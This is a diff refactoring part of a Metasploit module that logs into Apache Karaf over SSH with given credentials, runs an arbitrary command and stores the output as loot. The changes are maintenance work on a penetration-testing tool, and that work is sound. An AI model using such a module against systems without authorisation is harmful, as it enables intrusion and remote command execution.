@@ -25,13 +25,8 @@ class MetasploitModule < Msf::Auxiliary
         ],
       'Platform'       => 'unix',
       'Arch'           => ARCH_CMD,
-      'Targets'        =>
-        [
-          ['Apache Karaf', {}],
-        ],
       'Privileged'     => true,
-      'DisclosureDate' => "Feb 9 2016",
-      'DefaultTarget'  => 0))
+      'DisclosureDate' => '2016-02-09'))
 
     register_options(
       [
@@ -68,16 +63,11 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def do_login(user, pass, ip)
-    factory = ssh_socket_factory
-    opts = {
-      auth_methods:    ['password'],
-      port:            rport,
-      config:          false,
-      use_agent:       false,
-      password:        pass,
-      proxy:           factory,
-      non_interactive: true
-    }
+    opts = ssh_client_defaults.merge({
+      :auth_methods    => ['password'],
+      :port            => rport,
+      :password        => pass,
+    })
 
     opts.merge!(verbose: :debug) if datastore['SSH_DEBUG']
 
@@ -115,7 +105,7 @@ class MetasploitModule < Msf::Auxiliary
     print_status("#{ip}:#{rport} - Attempt to login...")
     ssh = do_login(username, password, ip)
     if ssh
-      output = ssh.exec!("shell:exec #{cmd}\n").to_s
+      output = ssh.exec!("#{cmd}\n").to_s
       if output
         print_good("#{ip}:#{rport} - Command successfully executed.  Output: #{output}")
         store_loot("apache.karaf.command",
